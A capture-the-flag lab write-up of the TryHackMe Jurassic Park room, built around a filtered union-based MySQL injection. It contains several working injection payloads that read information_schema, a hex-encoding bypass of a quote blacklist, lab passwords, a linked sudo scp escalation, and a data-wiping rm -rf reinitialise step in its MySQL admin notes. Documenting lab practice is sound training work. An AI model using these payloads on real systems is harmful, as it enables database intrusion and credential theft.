# Jurassic Park Helped-Through

Name: Jurassic-Park
Date:  28/12/2023
Difficulty: Hard  
Goals: 
- Had some trouble with SQLi
- Learn some MySQL
	- Had forgotten `group_concat()` exists
	- Union based injections from a URL parameter throw myself off a building level of why do I not need quotation marks.
- Turn flashcards into UltraMethods for the eventual cheatsheet of doom (TTPs) for CTFs and get excited to use everything   
- AOC no insiderPHD help or reading https://tryhackme.com/room/adventofcyber2023 - Failed, because of lack of time. Alternatively:
- https://tryhackme.com/room/wekorra
- https://tryhackme.com/room/gallery666
Learnt:
- `nuclei` needs `-etags cve` to prevent autoexploiting
- The meme are very strong with this box
- Start smaller in sql injection
- THE NO LOGIC REQUIRED IS THE ISSUE - WHY PHIND WHY?!
	- AND combine 
- AI has some good ideas and some really weird ideas. 
- Struggling to get there felt good and without AL mostly or AI 
 Beyond Root:
- MySQL install
- Make 2 databases, fill it with data, then make cli queries without incrementally enumerating rows and columns - make smart query with brain please to understand the SQL  

https://tryhackme.com/room/jurassicpark
https://www.youtube.com/watch?v=EqUJxKQzaSM

- [[Jurassic-Park-Notes.md]]
- [[Jurassic-Park-CMD-by-CMDs.md]]


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![](ping.png)

Nmap tries SQL injections
![](nmap-vuln-sqli.png)

Music on websites exist
![](musiconwebsiteexist.png)

IDOR not allowed
![](nopleaseon-1.png)

Quotes not allowed
![](quotemagicwords.png)

Robots.txt is in great pain
![](bestrobotdottext.png)

Stealing code to run music on a website one day
![](timerandmusicinsrc.png)

Testing `&` not realising I do not need additional logic
![](testampersandandquote.png)

Checking `/assets/` directory.
![](nmapsqlkspideronassets.png)

I found the error before Al finishing talking, which is a good sign
![](alstillltalkingIfoundtheerrorbuttooamazedbywebdev.png)

Prettifying JavaScript with Cyberchef
![](thatsweetbadjscode.png)

Going through blacklisted characters more methodologically
![](zeroquotenedry.png)

## Exploit


-  id parameter is vulnerable 
	- SQL is being queried for the number of packages
	- Filtering 
		- blacklisting  `' -- # %23 @`
		- usable ` | ! , . ()` 
		- breaks:  \` 

PHP is making backend requests  

- Disclosure of the stack having a MySQL server
```html
<!--<div class="error">Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near "%" at line 13</div>-->
```

- Play guess the non-parameterised SQL query
```sql
SELECT name, price, quantity FROM packages WHERE id=
```

`1 OR 2`


The confusion point where I still think I need logic to make additional statements
![](1or2.png)

5 minutes of round query square payloads...
![](5minsofroundquerysquarepayload.png)

4 minutes of round query square payloads... lesson learnt - start small with SQL!
![](startwaythesqlsmaller.png)

Logic is extra apparently design is just design an d I have some deep set bias on LOGIC IS REQUIRED!
![](tryappendwithoutlogicfool.png)

Retreading steps
![](retrodmystepswithoutlogic.png)

PARK, PARK, PARK, PARK
![](ANSWERNUMBERONE.png)

Getting some information from the information.schema.
![](doingit.png)

Stopped at - https://www.youtube.com/watch?v=EqUJxKQzaSM 1:26:49 as I want try the rest myself after being gentle pushed back to having a direction after the no logic conundrum of AoC 2023 that threw me. Week or so later I returned realising how that SQLi works for demonstrative purposes it was not a nice explanation. I did it by reading the the page instead of trying myself due to lack of time. What I have learnt so far and from the AoC
- What is the website doing functionally with components on the same network or server or external dependencies?
	- Understand the situation part 0!!
- Understand the situation part 1 - Play guess the non-parameterise SQL query
- Be methodologically and read output
- The methodology that works from actual professionals and experts sometimes is not going to just going to work on CTFs
- Understand the situation part 2 - You may not need logic or quotes 
- Start small as possible
- Build queries up slowly
- Before diving down the payload rabbit hole of what works:
	- Objectives - MAKE A BIG NOTE TO PREVENT THE MENTAL RABBITHOLES
	- Set a timer - SQL injections are always time consuming and at very extremely time consuming  
	- Prospective - e.g MSSQL EXEC xp_cmdshell funtimes


```sql
1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,concat(schema_name)+FROM+information_schema.schemata 
```


```sql
1+UNION+ALL+SELECT+NULL,NULL,version(),NULL,concat(schema_name)+FROM+information_schema.schemata
```
![](versions.png)

Its working
```sql
1+UNION+ALL+SELECT+NULL,NULL,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata
```

![](gettingthedatabases.png)

Failed imagination
```sql

1+UNION+ALL+SELECT+NULL,(SELECT+*+FROM+PARK),version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,(SELECT+users+FROM+PARK),version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,group_concat(*)+FROM+PARK.users,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,group_concat(table_name)+FROM+PARK.users,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,roup_concat(table_name)+FROM+information_schema.tables+WHERE+TABLE_SCHEMA+LIKE+PARK,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,group_concat(table_name)+FROM+information_schema.tables+WHERE+TABLE_SCHEMA+=+"PARK"+AND+WHERE+TABLE_NAME+LIKE+USERS,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata


1+UNION+ALL+SELECT+NULL,group_concat(table_name)+FROM+park.tables,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,concat(column_name)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME+LIKE+users,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata 
```

![](hexunhexunhexdeciamalPHIND.png)

![](phindquotesnoquotesquotesquoteyourphindingquoter.png)

Hex encode strings as a bypass - be aware of how the how the SQL is treating HEX as an entire column,table, etc so has limitations.  
```sql
CONCAT(UNHEX("D3ADB33F"),UNHEX("C0FFEE"))
```

At this point I find, do not pardon the pun, in the weeds of concentration and wildness of apathy.


More failed imagination and usage of [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#extract-data-without-columns-name)
```sql
1+UNION+ALL+SELECT+NULL,group_concat(table_name)+FROM+information_schema.TABLES+where+table_schema="PARK",version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata
```

![](itsbeenawhileinjection.png)

![](becausebecausegroupconcat.png)


![](yessssssssssss2millionlinesofpayloads.png)



Wildcard Jugular for those Man Jugs and Body-Neck combo.
![](MyDenisNegreyIsBEINGtooGOoodFORME.png)


![](SEQUENCEOFSQLI.png)


```
ID | password
1 D0nt3ATM3 
2 ih8dinos
```

Not really sure how we are suppose to guess or how really this is or 
![](usernamereally.png)

No USER field..
![](nouserfield.png)

Checking Dennis
![](checkingfordennis.png)![]()
![]()
## Foothold


![](dennisreallyreallylikepasswordreuse.png)

## Privilege Escalation

[and root](https://gtfobins.github.io/gtfobins/scp/#sudo) [it may take some time](https://www.youtube.com/watch?v=ss47ffaqA_o)
![](androot.png)

![](weirdflagcheckwriteup.png)

For second flag or it is just in the Mysql database or config.php
```bash
grep -r -e 'flag2.([a-zA-Z0-9]){20,}' / 2>/dev/null
```

## Post-Root-Reflection  

AI is weird using it effectively without becoming a question slave is question in and of itself.

Key takeaways
- Always play guess the SQL query
	- Union statements of the legitimate query must be mirrored in our SQL injection
- Start smaller 
- group_concat() 
	- must be placed at the dn of a query as it is a aggregate function
	- you cannot use the result of `GROUP_CONCAT()` for the `IN` operator


Things that worked - URL decode

```sql
1+UNION+ALL+SELECT+NULL,NULL,version(),NULL,group_concat(schema_name)+FROM+information_schema.schemata

1+UNION+ALL+SELECT+NULL,"HELLO",version(),NULL,group_concat(table_name)+FROM+information_schema.TABLES+where+table_schema="park"

-- Do not need the Database name
1+UNION+ALL+SELECT+NULL,NULL,version(),NULL,group_concat(column_name)+FROM+information_schema.columns+where+table_name="users"
```


https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
## Beyond Root



Phind says this
- If there are multiple tables named "users" in different schemas, the query will return metadata from all of them. [dba.stackexchange](https://dba.stackexchange.com/questions/204300/select-all-columns-with-same-name-from-different-tables) - [PHIND](https://www.phind.com/search?cache=jqnuad8tect3yp2nsk6sbr45)
- The reference is bad in relevance.

#### Play audio, music and troll with with JavaScript

```js
<video src="[assets/magic.mp3](http://10.10.150.172/assets/magic.mp3)" autoplay></video>
<script>
async function lol() {
	let i = 1;
	while (i < 100) {
		document.querySelector('#magicwork').innerHTML += "<b>YOU DIDN'T SAY THE MAGIC WORD!</b></br>";
		await sleep(50);
		i++;
	}
	document.querySelector('#magicwork').innerHTML += 'Try SqlMap.. I dare you..';
}
async function play() {
	return new Promise(async function (resolve, reject) {
		console.log('in');
		var audioElement = document.createElement('audio');
		audioElement.setAttribute('src', 'assets/lel.ogg');
		audioElement.load();
		audioElement.addEventListener('load', function () {
			audioElement.play();
			console.log('in2');
			return resolve();
		}, true);
	});
}
(async function () {
	play();
	await lol();
}());
</script>
```


https://ubuntu.com/server/docs/databases-mysql

```bash

apt install mysql-server

ss -tap | grep mysql && echo "" && service mysql status



service mysql restart
journalctl -u mysql

cat /etc/mysql/mysql.conf.d/mysqld.cnf 
# change the bind address to something sensible
bind-address = 192.168.0.5


systemctl restart mysql.service

```

Dump a database with legitimate `mysqldump` or use `pv` or pipeviewer
```bash
mysqldump --all-databases --routines -u root -p > ~/fulldump.sql

sudo apt install pv
pv ~/fulldump.sql | mysql
```

Backup your databases with `rsync`
```bash
sudo rsync -avz /etc/mysql /root/mysql-backup
# Reinitialise e nsure the ownership of the directory is correct
sudo rm -rf /var/lib/mysql/*
sudo mysqld --initialize
sudo chown -R mysql: /var/lib/mysql
sudo service mysql start
```

